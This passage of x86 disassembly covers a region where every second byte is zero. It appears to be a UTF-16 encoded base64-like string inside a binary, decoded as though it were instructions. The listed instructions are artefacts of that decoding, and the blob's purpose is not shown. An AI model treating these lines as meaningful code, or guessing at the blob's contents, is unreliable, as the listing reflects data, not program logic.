  40a134:	73 00                	jae    0x40a136
  40a136:	50                   	push   %eax
  40a137:	00 57 00             	add    %dl,0x0(%edi)
  40a13a:	50                   	push   %eax
  40a13b:	00 51 00             	add    %dl,0x0(%ecx)
  40a13e:	38 00                	cmp    %al,(%eax)
  40a140:	53                   	push   %ebx
  40a141:	00 6e 00             	add    %ch,0x0(%esi)
  40a144:	78 00                	js     0x40a146
  40a146:	76 00                	jbe    0x40a148
  40a148:	45                   	inc    %ebp
  40a149:	00 55 00             	add    %dl,0x0(%ebp)
  40a14c:	42                   	inc    %edx
  40a14d:	00 49 00             	add    %cl,0x0(%ecx)
  40a150:	6b 00 35             	imul   $0x35,(%eax),%eax
  40a153:	00 59 00             	add    %bl,0x0(%ecx)
  40a156:	71 00                	jno    0x40a158
  40a158:	70 00                	jo     0x40a15a
  40a15a:	38 00                	cmp    %al,(%eax)
  40a15c:	36 00 6d 00          	add    %ch,%ss:0x0(%ebp)
  40a160:	5a                   	pop    %edx
  40a161:	00 64 00 37          	add    %ah,0x37(%eax,%eax,1)
  40a165:	00 66 00             	add    %ah,0x0(%esi)
  40a168:	67 00 2b             	add    %ch,(%bp,%di)
  40a16b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a16e:	79 00                	jns    0x40a170
  40a170:	37                   	aaa
  40a171:	00 75 00             	add    %dh,0x0(%ebp)
  40a174:	44                   	inc    %esp
  40a175:	00 2b                	add    %ch,(%ebx)
  40a177:	00 71 00             	add    %dh,0x0(%ecx)
  40a17a:	30 00                	xor    %al,(%eax)
  40a17c:	6d                   	insl   (%dx),%es:(%edi)
  40a17d:	00 46 00             	add    %al,0x0(%esi)
  40a180:	54                   	push   %esp
  40a181:	00 30                	add    %dh,(%eax)
  40a183:	00 6a 00             	add    %ch,0x0(%edx)
  40a186:	67 00 35             	add    %dh,(%di)
  40a189:	00 42 00             	add    %al,0x0(%edx)
  40a18c:	35 00 54 00 7a       	xor    $0x7a005400,%eax
  40a191:	00 2f                	add    %ch,(%edi)
  40a193:	00 4c 00 4f          	add    %cl,0x4f(%eax,%eax,1)
  40a197:	00 44 00 53          	add    %al,0x53(%eax,%eax,1)
  40a19b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a19e:	37                   	aaa
  40a19f:	00 31                	add    %dh,(%ecx)
  40a1a1:	00 77 00             	add    %dh,0x0(%edi)
  40a1a4:	47                   	inc    %edi
  40a1a5:	00 6a 00             	add    %ch,0x0(%edx)
  40a1a8:	39 00                	cmp    %eax,(%eax)
  40a1aa:	44                   	inc    %esp
  40a1ab:	00 56 00             	add    %dl,0x0(%esi)
  40a1ae:	51                   	push   %ecx
  40a1af:	00 63 00             	add    %ah,0x0(%ebx)
  40a1b2:	46                   	inc    %esi
  40a1b3:	00 39                	add    %bh,(%ecx)
  40a1b5:	00 44 00 5a          	add    %al,0x5a(%eax,%eax,1)
  40a1b9:	00 4c 00 4a          	add    %cl,0x4a(%eax,%eax,1)
  40a1bd:	00 77 00             	add    %dh,0x0(%edi)
  40a1c0:	4e                   	dec    %esi
  40a1c1:	00 46 00             	add    %al,0x0(%esi)
  40a1c4:	5a                   	pop    %edx
  40a1c5:	00 7a 00             	add    %bh,0x0(%edx)
  40a1c8:	55                   	push   %ebp
  40a1c9:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1cc:	6c                   	insb   (%dx),%es:(%edi)
  40a1cd:	00 32                	add    %dh,(%edx)
  40a1cf:	00 47 00             	add    %al,0x0(%edi)
  40a1d2:	62 00                	bound  %eax,(%eax)
  40a1d4:	30 00                	xor    %al,(%eax)
  40a1d6:	4f                   	dec    %edi
  40a1d7:	00 4e 00             	add    %cl,0x0(%esi)
  40a1da:	34 00                	xor    $0x0,%al
  40a1dc:	49                   	dec    %ecx
  40a1dd:	00 4d 00             	add    %cl,0x0(%ebp)
  40a1e0:	53                   	push   %ebx
  40a1e1:	00 46 00             	add    %al,0x0(%esi)
  40a1e4:	47                   	inc    %edi
  40a1e5:	00 62 00             	add    %ah,0x0(%edx)
  40a1e8:	61                   	popa
  40a1e9:	00 46 00             	add    %al,0x0(%esi)
  40a1ec:	72 00                	jb     0x40a1ee
  40a1ee:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1ef:	00 65 00             	add    %ah,0x0(%ebp)
  40a1f2:	50                   	push   %eax
  40a1f3:	00 6d 00             	add    %ch,0x0(%ebp)
  40a1f6:	64 00 56 00          	add    %dl,%fs:0x0(%esi)
  40a1fa:	38 00                	cmp    %al,(%eax)
  40a1fc:	47                   	inc    %edi
  40a1fd:	00 68 00             	add    %ch,0x0(%eax)
  40a200:	6e                   	outsb  %ds:(%esi),(%dx)
  40a201:	00 31                	add    %dh,(%ecx)
  40a203:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40a207:	00 59 00             	add    %bl,0x0(%ecx)
  40a20a:	49                   	dec    %ecx
  40a20b:	00 6c 00 35          	add    %ch,0x35(%eax,%eax,1)
  40a20f:	00 31                	add    %dh,(%ecx)
  40a211:	00 4b 00             	add    %cl,0x0(%ebx)
  40a214:	6e                   	outsb  %ds:(%esi),(%dx)
  40a215:	00 4a 00             	add    %cl,0x0(%edx)
  40a218:	7a 00                	jp     0x40a21a
  40a21a:	73 00                	jae    0x40a21c
  40a21c:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40a220:	64 00 42 00          	add    %al,%fs:0x0(%edx)
  40a224:	4d                   	dec    %ebp
  40a225:	00 6f 00             	add    %ch,0x0(%edi)
  40a228:	7a 00                	jp     0x40a22a
  40a22a:	77 00                	ja     0x40a22c
  40a22c:	58                   	pop    %eax
  40a22d:	00 2b                	add    %ch,(%ebx)
  40a22f:	00 33                	add    %dh,(%ebx)
  40a231:	00 4f 00             	add    %cl,0x0(%edi)
  40a234:	56                   	push   %esi
  40a235:	00 47 00             	add    %al,0x0(%edi)
  40a238:	41                   	inc    %ecx
  40a239:	00 78 00             	add    %bh,0x0(%eax)
  40a23c:	59                   	pop    %ecx
  40a23d:	00 43 00             	add    %al,0x0(%ebx)
  40a240:	4d                   	dec    %ebp
  40a241:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40a245:	00 43 00             	add    %al,0x0(%ebx)
  40a248:	77 00                	ja     0x40a24a
  40a24a:	43                   	inc    %ebx
  40a24b:	00 69 00             	add    %ch,0x0(%ecx)
  40a24e:	43                   	inc    %ebx
  40a24f:	00 6e 00             	add    %ch,0x0(%esi)
  40a252:	61                   	popa
  40a253:	00 43 00             	add    %al,0x0(%ebx)
  40a256:	72 00                	jb     0x40a258
  40a258:	43                   	inc    %ebx
  40a259:	00 2f                	add    %ch,(%edi)
  40a25b:	00 78 00             	add    %bh,0x0(%eax)
  40a25e:	6a 00                	push   $0x0
  40a260:	46                   	inc    %esi
  40a261:	00 5a 00             	add    %bl,0x0(%edx)
  40a264:	79 00                	jns    0x40a266
  40a266:	62 00                	bound  %eax,(%eax)
  40a268:	76 00                	jbe    0x40a26a
  40a26a:	70 00                	jo     0x40a26c
  40a26c:	35 00 77 00 36       	xor    $0x36007700,%eax
  40a271:	00 54 00 32          	add    %dl,0x32(%eax,%eax,1)
  40a275:	00 6d 00             	add    %ch,0x0(%ebp)
  40a278:	67 00 36 00 45       	add    %dh,0x4500
  40a27d:	00 2f                	add    %ch,(%edi)
  40a27f:	00 32                	add    %dh,(%edx)
  40a281:	00 6b 00             	add    %ch,0x0(%ebx)
  40a284:	76 00                	jbe    0x40a286
  40a286:	76 00                	jbe    0x40a288
  40a288:	58                   	pop    %eax
  40a289:	00 55 00             	add    %dl,0x0(%ebp)
  40a28c:	4a                   	dec    %edx
  40a28d:	00 4e 00             	add    %cl,0x0(%esi)
  40a290:	70 00                	jo     0x40a292
  40a292:	34 00                	xor    $0x0,%al
  40a294:	56                   	push   %esi
  40a295:	00 38                	add    %bh,(%eax)
  40a297:	00 6a 00             	add    %ch,0x0(%edx)
  40a29a:	72 00                	jb     0x40a29c
  40a29c:	72 00                	jb     0x40a29e
  40a29e:	56                   	push   %esi
  40a29f:	00 2b                	add    %ch,(%ebx)
  40a2a1:	00 78 00             	add    %bh,0x0(%eax)
  40a2a4:	4a                   	dec    %edx
  40a2a5:	00 67 00             	add    %ah,0x0(%edi)
  40a2a8:	75 00                	jne    0x40a2aa
  40a2aa:	75 00                	jne    0x40a2ac
  40a2ac:	50                   	push   %eax
  40a2ad:	00 37                	add    %dh,(%edi)
  40a2af:	00 52 00             	add    %dl,0x0(%edx)
  40a2b2:	61                   	popa
  40a2b3:	00 6c 00 52          	add    %ch,0x52(%eax,%eax,1)
  40a2b7:	00 67 00             	add    %ah,0x0(%edi)
  40a2ba:	49                   	dec    %ecx
  40a2bb:	00 42 00             	add    %al,0x0(%edx)
  40a2be:	64 00 49 00          	add    %cl,%fs:0x0(%ecx)
  40a2c2:	32 00                	xor    (%eax),%al
  40a2c4:	42                   	inc    %edx
  40a2c5:	00 68 00             	add    %ch,0x0(%eax)
  40a2c8:	41                   	inc    %ecx
  40a2c9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2cc:	41                   	inc    %ecx
  40a2cd:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a2d0:	39 00                	cmp    %eax,(%eax)
  40a2d2:	67 00 4a 00          	add    %cl,0x0(%bp,%si)
  40a2d6:	47                   	inc    %edi
  40a2d7:	00 6e 00             	add    %ch,0x0(%esi)
  40a2da:	38 00                	cmp    %al,(%eax)
  40a2dc:	39 00                	cmp    %eax,(%eax)
  40a2de:	68 00 56 00 42       	push   $0x42005600
  40a2e3:	00 38                	add    %bh,(%eax)
  40a2e5:	00 6e 00             	add    %ch,0x0(%esi)
  40a2e8:	50                   	push   %eax
  40a2e9:	00 7a 00             	add    %bh,0x0(%edx)
  40a2ec:	5a                   	pop    %edx
  40a2ed:	00 39                	add    %bh,(%ecx)
  40a2ef:	00 64 00 44          	add    %ah,0x44(%eax,%eax,1)
  40a2f3:	00 59 00             	add    %bl,0x0(%ecx)
  40a2f6:	51                   	push   %ecx
  40a2f7:	00 4d 00             	add    %cl,0x0(%ebp)
  40a2fa:	36 00 2b             	add    %ch,%ss:(%ebx)
  40a2fd:	00 50 00             	add    %dl,0x0(%eax)
  40a300:	66 00 6d 00          	data16 add %ch,0x0(%ebp)
  40a304:	4f                   	dec    %edi
  40a305:	00 4e 00             	add    %cl,0x0(%esi)
  40a308:	49                   	dec    %ecx
  40a309:	00 75 00             	add    %dh,0x0(%ebp)
  40a30c:	57                   	push   %edi
  40a30d:	00 38                	add    %bh,(%eax)
  40a30f:	00 41 00             	add    %al,0x0(%ecx)
  40a312:	32 00                	xor    (%eax),%al
  40a314:	49                   	dec    %ecx
  40a315:	00 54 00 69          	add    %dl,0x69(%eax,%eax,1)
  40a319:	00 70 00             	add    %dh,0x0(%eax)
  40a31c:	67 00 4d 00          	add    %cl,0x0(%di)
  40a320:	35 00 34 00 45       	xor    $0x45003400,%eax
  40a325:	00 51 00             	add    %dl,0x0(%ecx)
  40a328:	33 00                	xor    (%eax),%eax
  40a32a:	63 00                	arpl   %eax,(%eax)
  40a32c:	50                   	push   %eax
  40a32d:	00 45 00             	add    %al,0x0(%ebp)
  40a330:	30 00                	xor    %al,(%eax)
  40a332:	47                   	inc    %edi
  40a333:	00 6c 00 6e          	add    %ch,0x6e(%eax,%eax,1)
  40a337:	00 44 00 76          	add    %al,0x76(%eax,%eax,1)
  40a33b:	00 77 00             	add    %dh,0x0(%edi)
  40a33e:	51                   	push   %ecx
  40a33f:	00 56 00             	add    %dl,0x0(%esi)
  40a342:	70 00                	jo     0x40a344
  40a344:	50                   	push   %eax
  40a345:	00 59 00             	add    %bl,0x0(%ecx)
  40a348:	51                   	push   %ecx
  40a349:	00 74 00 74          	add    %dh,0x74(%eax,%eax,1)
  40a34d:	00 45 00             	add    %al,0x0(%ebp)
  40a350:	55                   	push   %ebp
  40a351:	00 41 00             	add    %al,0x0(%ecx)
  40a354:	44                   	inc    %esp
  40a355:	00 6b 00             	add    %ch,0x0(%ebx)
  40a358:	49                   	dec    %ecx
  40a359:	00 30                	add    %dh,(%eax)
  40a35b:	00 64 00 45          	add    %ah,0x45(%eax,%eax,1)
  40a35f:	00 71 00             	add    %dh,0x0(%ecx)
  40a362:	32 00                	xor    (%eax),%al
  40a364:	45                   	inc    %ebp
  40a365:	00 37                	add    %dh,(%edi)
  40a367:	00 36                	add    %dh,(%esi)
  40a369:	00 57 00             	add    %dl,0x0(%edi)
  40a36c:	34 00                	xor    $0x0,%al
  40a36e:	73 00                	jae    0x40a370
  40a370:	6a 00                	push   $0x0
  40a372:	38 00                	cmp    %al,(%eax)
  40a374:	70 00                	jo     0x40a376
  40a376:	4d                   	dec    %ebp
  40a377:	00 53 00             	add    %dl,0x0(%ebx)
  40a37a:	79 00                	jns    0x40a37c
  40a37c:	67 00 34             	add    %dh,(%si)
  40a37f:	00 6f 00             	add    %ch,0x0(%edi)
  40a382:	68 00 34 00 49       	push   $0x49003400
  40a387:	00 79 00             	add    %bh,0x0(%ecx)
  40a38a:	32 00                	xor    (%eax),%al
  40a38c:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40a390:	42                   	inc    %edx
  40a391:	00 59 00             	add    %bl,0x0(%ecx)
  40a394:	34 00                	xor    $0x0,%al
  40a396:	46                   	inc    %esi
  40a397:	00 42 00             	add    %al,0x0(%edx)
  40a39a:	31 00                	xor    %eax,(%eax)
  40a39c:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40a3a0:	57                   	push   %edi
  40a3a1:	00 37                	add    %dh,(%edi)
  40a3a3:	00 36                	add    %dh,(%esi)
  40a3a5:	00 31                	add    %dh,(%ecx)
  40a3a7:	00 51 00             	add    %dl,0x0(%ecx)
  40a3aa:	36 00 45 00          	add    %al,%ss:0x0(%ebp)
  40a3ae:	6f                   	outsl  %ds:(%esi),(%dx)
  40a3af:	00 35 00 47 00 42    	add    %dh,0x42004700
  40a3b5:	00 52 00             	add    %dl,0x0(%edx)
  40a3b8:	6b 00 52             	imul   $0x52,(%eax),%eax
  40a3bb:	00 50 00             	add    %dl,0x0(%eax)
  40a3be:	33 00                	xor    (%eax),%eax
  40a3c0:	55                   	push   %ebp
  40a3c1:	00 44 00 69          	add    %al,0x69(%eax,%eax,1)
  40a3c5:	00 6a 00             	add    %ch,0x0(%edx)
  40a3c8:	59                   	pop    %ecx
  40a3c9:	00 46 00             	add    %al,0x0(%esi)
  40a3cc:	68 00 4c 00 49       	push   $0x49004c00
  40a3d1:	00 44 00 33          	add    %al,0x33(%eax,%eax,1)
  40a3d5:	00 2b                	add    %ch,(%ebx)
  40a3d7:	00 74 00 51          	add    %dh,0x51(%eax,%eax,1)
  40a3db:	00 47 00             	add    %al,0x0(%edi)
  40a3de:	68 00 79 00 7a       	push   $0x7a007900
  40a3e3:	00 56 00             	add    %dl,0x0(%esi)
  40a3e6:	50                   	push   %eax
  40a3e7:	00 2f                	add    %ch,(%edi)
  40a3e9:	00 36                	add    %dh,(%esi)
  40a3eb:	00 30                	add    %dh,(%eax)
  40a3ed:	00 41 00             	add    %al,0x0(%ecx)
  40a3f0:	70 00                	jo     0x40a3f2
  40a3f2:	46                   	inc    %esi
  40a3f3:	00 77 00             	add    %dh,0x0(%edi)
  40a3f6:	32 00                	xor    (%eax),%al
  40a3f8:	47                   	inc    %edi
  40a3f9:	00 38                	add    %bh,(%eax)
  40a3fb:	00 66 00             	add    %ah,0x0(%esi)
  40a3fe:	43                   	inc    %ebx
  40a3ff:	00 79 00             	add    %bh,0x0(%ecx)
  40a402:	41                   	inc    %ecx
  40a403:	00 64 00 6b          	add    %ah,0x6b(%eax,%eax,1)
  40a407:	00 32                	add    %dh,(%edx)
  40a409:	00 49 00             	add    %cl,0x0(%ecx)
  40a40c:	58                   	pop    %eax
  40a40d:	00 59 00             	add    %bl,0x0(%ecx)
  40a410:	63 00                	arpl   %eax,(%eax)
  40a412:	42                   	inc    %edx
  40a413:	00 6e 00             	add    %ch,0x0(%esi)
  40a416:	49                   	dec    %ecx
  40a417:	00 71 00             	add    %dh,0x0(%ecx)
  40a41a:	57                   	push   %edi
  40a41b:	00 4d 00             	add    %cl,0x0(%ebp)
  40a41e:	66 00 66 00          	data16 add %ah,0x0(%esi)
  40a422:	62 00                	bound  %eax,(%eax)
  40a424:	67 00 64 00          	add    %ah,0x0(%si)
  40a428:	48                   	dec    %eax
  40a429:	00 33                	add    %dh,(%ebx)
  40a42b:	00 47 00             	add    %al,0x0(%edi)
  40a42e:	53                   	push   %ebx
  40a42f:	00 4c 00 64          	add    %cl,0x64(%eax,%eax,1)
  40a433:	00 58 00             	add    %bl,0x0(%eax)
  40a436:	78 00                	js     0x40a438
  40a438:	31 00                	xor    %eax,(%eax)
  40a43a:	44                   	inc    %esp
  40a43b:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a43e:	45                   	inc    %ebp
  40a43f:	00 4c 00 72          	add    %cl,0x72(%eax,%eax,1)
  40a443:	00 6a 00             	add    %ch,0x0(%edx)
  40a446:	48                   	dec    %eax
  40a447:	00 37                	add    %dh,(%edi)
  40a449:	00 77 00             	add    %dh,0x0(%edi)
  40a44c:	36 00 61 00          	add    %ah,%ss:0x0(%ecx)
  40a450:	4b                   	dec    %ebx
  40a451:	00 76 00             	add    %dh,0x0(%esi)
  40a454:	55                   	push   %ebp
  40a455:	00 6d 00             	add    %ch,0x0(%ebp)
  40a458:	58                   	pop    %eax
  40a459:	00 74 00 46          	add    %dh,0x46(%eax,%eax,1)
  40a45d:	00 61 00             	add    %ah,0x0(%ecx)
  40a460:	4c                   	dec    %esp
  40a461:	00 6e 00             	add    %ch,0x0(%esi)
  40a464:	31 00                	xor    %eax,(%eax)
  40a466:	73 00                	jae    0x40a468
  40a468:	37                   	aaa
  40a469:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40a46d:	00 41 00             	add    %al,0x0(%ecx)
  40a470:	32 00                	xor    (%eax),%al
  40a472:	54                   	push   %esp
  40a473:	00 49 00             	add    %cl,0x0(%ecx)
  40a476:	69 00 68 00 78 00    	imul   $0x780068,(%eax),%eax
  40a47c:	37                   	aaa
  40a47d:	00 4f 00             	add    %cl,0x0(%edi)
  40a480:	44                   	inc    %esp
  40a481:	00 79 00             	add    %bh,0x0(%ecx)
  40a484:	69 00 63 00 57 00    	imul   $0x570063,(%eax),%eax
  40a48a:	75 00                	jne    0x40a48c
  40a48c:	2b 00                	sub    (%eax),%eax
  40a48e:	39 00                	cmp    %eax,(%eax)
  40a490:	67 00 68 00          	add    %ch,0x0(%bx,%si)
  40a494:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40a498:	51                   	push   %ecx
  40a499:	00 36                	add    %dh,(%esi)
  40a49b:	00 32                	add    %dh,(%edx)
  40a49d:	00 5a 00             	add    %bl,0x0(%edx)
  40a4a0:	6d                   	insl   (%dx),%es:(%edi)
  40a4a1:	00 62 00             	add    %ah,0x0(%edx)
  40a4a4:	39 00                	cmp    %eax,(%eax)
  40a4a6:	65 00 44 00 6b       	add    %al,%gs:0x6b(%eax,%eax,1)
  40a4ab:	00 6b 00             	add    %ch,0x0(%ebx)
  40a4ae:	67 00 55 00          	add    %dl,0x0(%di)
  40a4b2:	6d                   	insl   (%dx),%es:(%edi)
  40a4b3:	00 55 00             	add    %dl,0x0(%ebp)
  40a4b6:	63 00                	arpl   %eax,(%eax)
  40a4b8:	30 00                	xor    %al,(%eax)
  40a4ba:	68 00 6c 00 46       	push   $0x46006c00
  40a4bf:	00 2b                	add    %ch,(%ebx)
  40a4c1:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a4c4:	47                   	inc    %edi
  40a4c5:	00 62 00             	add    %ah,0x0(%edx)
  40a4c8:	41                   	inc    %ecx
  40a4c9:	00 44 00 66          	add    %al,0x66(%eax,%eax,1)
  40a4cd:	00 43 00             	add    %al,0x0(%ebx)
  40a4d0:	54                   	push   %esp
  40a4d1:	00 72 00             	add    %dh,0x0(%edx)
  40a4d4:	6a 00                	push   $0x0
  40a4d6:	54                   	push   %esp
  40a4d7:	00 52 00             	add    %dl,0x0(%edx)
  40a4da:	4c                   	dec    %esp
  40a4db:	00 67 00             	add    %ah,0x0(%edi)
  40a4de:	6e                   	outsb  %ds:(%esi),(%dx)
  40a4df:	00 52 00             	add    %dl,0x0(%edx)
  40a4e2:	54                   	push   %esp
  40a4e3:	00 61 00             	add    %ah,0x0(%ecx)
  40a4e6:	37                   	aaa
  40a4e7:	00 55 00             	add    %dl,0x0(%ebp)
  40a4ea:	58                   	pop    %eax
  40a4eb:	00 51 00             	add    %dl,0x0(%ecx)
  40a4ee:	76 00                	jbe    0x40a4f0
  40a4f0:	32 00                	xor    (%eax),%al
  40a4f2:	2f                   	das
  40a4f3:	00 30                	add    %dh,(%eax)
  40a4f5:	00 4b 00             	add    %cl,0x0(%ebx)
  40a4f8:	31 00                	xor    %eax,(%eax)
  40a4fa:	54                   	push   %esp
  40a4fb:	00 70 00             	add    %dh,0x0(%eax)
  40a4fe:	6c                   	insb   (%dx),%es:(%edi)
  40a4ff:	00 72 00             	add    %dh,0x0(%edx)
  40a502:	71 00                	jno    0x40a504
  40a504:	77 00                	ja     0x40a506
  40a506:	34 00                	xor    $0x0,%al
  40a508:	46                   	inc    %esi
  40a509:	00 68 00             	add    %ch,0x0(%eax)
  40a50c:	72 00                	jb     0x40a50e
  40a50e:	38 00                	cmp    %al,(%eax)
  40a510:	61                   	popa
  40a511:	00 67 00             	add    %ah,0x0(%edi)
  40a514:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
  40a518:	49                   	dec    %ecx
  40a519:	00 59 00             	add    %bl,0x0(%ecx)
  40a51c:	4d                   	dec    %ebp
  40a51d:	00 68 00             	add    %ch,0x0(%eax)
  40a520:	34 00                	xor    $0x0,%al
  40a522:	6d                   	insl   (%dx),%es:(%edi)
  40a523:	00 4a 00             	add    %cl,0x0(%edx)
  40a526:	43                   	inc    %ebx
  40a527:	00 57 00             	add    %dl,0x0(%edi)
  40a52a:	7a 00                	jp     0x40a52c
  40a52c:	63 00                	arpl   %eax,(%eax)
  40a52e:	46                   	inc    %esi
  40a52f:	00 67 00             	add    %ah,0x0(%edi)
  40a532:	4a                   	dec    %edx
  40a533:	00 66 00             	add    %ah,0x0(%esi)
  40a536:	5a                   	pop    %edx
  40a537:	00 70 00             	add    %dh,0x0(%eax)
  40a53a:	46                   	inc    %esi
  40a53b:	00 39                	add    %bh,(%ecx)
  40a53d:	00 45 00             	add    %al,0x0(%ebp)
  40a540:	72 00                	jb     0x40a542
  40a542:	44                   	inc    %esp
  40a543:	00 6d 00             	add    %ch,0x0(%ebp)
  40a546:	46                   	inc    %esi
  40a547:	00 6b 00             	add    %ch,0x0(%ebx)
  40a54a:	61                   	popa
  40a54b:	00 56 00             	add    %dl,0x0(%esi)
  40a54e:	77 00                	ja     0x40a550
  40a550:	36 00 30             	add    %dh,%ss:(%eax)
  40a553:	00 63 00             	add    %ah,0x0(%ebx)
  40a556:	51                   	push   %ecx
  40a557:	00 33                	add    %dh,(%ebx)
  40a559:	00 70 00             	add    %dh,0x0(%eax)
  40a55c:	78 00                	js     0x40a55e
  40a55e:	7a 00                	jp     0x40a560
  40a560:	2f                   	das
  40a561:	00 32                	add    %dh,(%edx)
  40a563:	00 30                	add    %dh,(%eax)
  40a565:	00 6c 00 49          	add    %ch,0x49(%eax,%eax,1)
  40a569:	00 4f 00             	add    %cl,0x0(%edi)
  40a56c:	6d                   	insl   (%dx),%es:(%edi)
  40a56d:	00 78 00             	add    %bh,0x0(%eax)
  40a570:	2b 00                	sub    (%eax),%eax
  40a572:	30 00                	xor    %al,(%eax)
  40a574:	74 00                	je     0x40a576
  40a576:	6a 00                	push   $0x0
  40a578:	50                   	push   %eax
  40a579:	00 4c 00 39          	add    %cl,0x39(%eax,%eax,1)
  40a57d:	00 6a 00             	add    %ch,0x0(%edx)
  40a580:	73 00                	jae    0x40a582
  40a582:	58                   	pop    %eax
  40a583:	00 4f 00             	add    %cl,0x0(%edi)
  40a586:	55                   	push   %ebp
  40a587:	00 4a 00             	add    %cl,0x0(%edx)
  40a58a:	73 00                	jae    0x40a58c
  40a58c:	61                   	popa
  40a58d:	00 4f 00             	add    %cl,0x0(%edi)
  40a590:	31 00                	xor    %eax,(%eax)
  40a592:	41                   	inc    %ecx
  40a593:	00 75 00             	add    %dh,0x0(%ebp)
  40a596:	78 00                	js     0x40a598
  40a598:	45                   	inc    %ebp
  40a599:	00 55 00             	add    %dl,0x0(%ebp)
  40a59c:	45                   	inc    %ebp
  40a59d:	00 30                	add    %dh,(%eax)
  40a59f:	00 71 00             	add    %dh,0x0(%ecx)
  40a5a2:	74 00                	je     0x40a5a4
  40a5a4:	71 00                	jno    0x40a5a6
  40a5a6:	31 00                	xor    %eax,(%eax)
  40a5a8:	54                   	push   %esp
  40a5a9:	00 64 00 2b          	add    %ah,0x2b(%eax,%eax,1)
  40a5ad:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5b0:	52                   	push   %edx
  40a5b1:	00 6e 00             	add    %ch,0x0(%esi)
  40a5b4:	65 00 62 00          	add    %ah,%gs:0x0(%edx)
  40a5b8:	6d                   	insl   (%dx),%es:(%edi)
  40a5b9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a5bc:	58                   	pop    %eax
  40a5bd:	00 74 00 37          	add    %dh,0x37(%eax,%eax,1)
  40a5c1:	00 75 00             	add    %dh,0x0(%ebp)
  40a5c4:	4c                   	dec    %esp
  40a5c5:	00 2b                	add    %ch,(%ebx)
  40a5c7:	00 64 00 39          	add    %ah,0x39(%eax,%eax,1)
  40a5cb:	00 31                	add    %dh,(%ecx)
  40a5cd:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40a5d1:	00 6b 00             	add    %ch,0x0(%ebx)
  40a5d4:	79 00                	jns    0x40a5d6
  40a5d6:	50                   	push   %eax
  40a5d7:	00 75 00             	add    %dh,0x0(%ebp)
  40a5da:	50                   	push   %eax
  40a5db:	00 58 00             	add    %bl,0x0(%eax)
  40a5de:	50                   	push   %eax
  40a5df:	00 52 00             	add    %dl,0x0(%edx)
  40a5e2:	62 00                	bound  %eax,(%eax)
  40a5e4:	6d                   	insl   (%dx),%es:(%edi)
  40a5e5:	00 57 00             	add    %dl,0x0(%edi)
  40a5e8:	51                   	push   %ecx
  40a5e9:	00 47 00             	add    %al,0x0(%edi)
  40a5ec:	73 00                	jae    0x40a5ee
  40a5ee:	76 00                	jbe    0x40a5f0
  40a5f0:	48                   	dec    %eax
  40a5f1:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5f4:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5f5:	00 57 00             	add    %dl,0x0(%edi)
  40a5f8:	46                   	inc    %esi
  40a5f9:	00 6e 00             	add    %ch,0x0(%esi)
  40a5fc:	7a 00                	jp     0x40a5fe
  40a5fe:	50                   	push   %eax
  40a5ff:	00 4a 00             	add    %cl,0x0(%edx)
  40a602:	56                   	push   %esi
  40a603:	00 47 00             	add    %al,0x0(%edi)
  40a606:	68 00 2f 00 51       	push   $0x51002f00
  40a60b:	00 50 00             	add    %dl,0x0(%eax)
  40a60e:	5a                   	pop    %edx
  40a60f:	00 46 00             	add    %al,0x0(%esi)
  40a612:	74 00                	je     0x40a614
  40a614:	38 00                	cmp    %al,(%eax)
  40a616:	36 00 64 00 33       	add    %ah,%ss:0x33(%eax,%eax,1)
  40a61b:	00 41 00             	add    %al,0x0(%ecx)
  40a61e:	47                   	inc    %edi
  40a61f:	00 47 00             	add    %al,0x0(%edi)
  40a622:	36 00 38             	add    %bh,%ss:(%eax)
  40a625:	00 66 00             	add    %ah,0x0(%esi)
  40a628:	52                   	push   %edx
  40a629:	00 30                	add    %dh,(%eax)
  40a62b:	00 39                	add    %bh,(%ecx)
  40a62d:	00 2b                	add    %ch,(%ebx)
  40a62f:	00 6c 00 39          	add    %ch,0x39(%eax,%eax,1)
  40a633:	00 78 00             	add    %bh,0x0(%eax)
  40a636:	4c                   	dec    %esp
  40a637:	00 73 00             	add    %dh,0x0(%ebx)
  40a63a:	4c                   	dec    %esp
  40a63b:	00 59 00             	add    %bl,0x0(%ecx)
  40a63e:	73 00                	jae    0x40a640
  40a640:	76 00                	jbe    0x40a642
  40a642:	76 00                	jbe    0x40a644
  40a644:	32 00                	xor    (%eax),%al
  40a646:	66 00 77 00          	data16 add %dh,0x0(%edi)
  40a64a:	76 00                	jbe    0x40a64c
  40a64c:	61                   	popa
  40a64d:	00 44 00 6e          	add    %al,0x6e(%eax,%eax,1)
  40a651:	00 34 00             	add    %dh,(%eax,%eax,1)
  40a654:	78 00                	js     0x40a656
  40a656:	45                   	inc    %ebp
  40a657:	00 58 00             	add    %bl,0x0(%eax)
  40a65a:	38 00                	cmp    %al,(%eax)
  40a65c:	74 00                	je     0x40a65e
  40a65e:	43                   	inc    %ebx
  40a65f:	00 52 00             	add    %dl,0x0(%edx)
  40a662:	43                   	inc    %ebx
  40a663:	00 50 00             	add    %dl,0x0(%eax)
  40a666:	59                   	pop    %ecx
  40a667:	00 38                	add    %bh,(%eax)
  40a669:	00 37                	add    %dh,(%edi)
  40a66b:	00 51 00             	add    %dl,0x0(%ecx)
  40a66e:	57                   	push   %edi
  40a66f:	00 58 00             	add    %bl,0x0(%eax)
  40a672:	73 00                	jae    0x40a674
  40a674:	4f                   	dec    %edi
  40a675:	00 4f 00             	add    %cl,0x0(%edi)
  40a678:	47                   	inc    %edi
  40a679:	00 6b 00             	add    %ch,0x0(%ebx)
  40a67c:	36 00 70 00          	add    %dh,%ss:0x0(%eax)
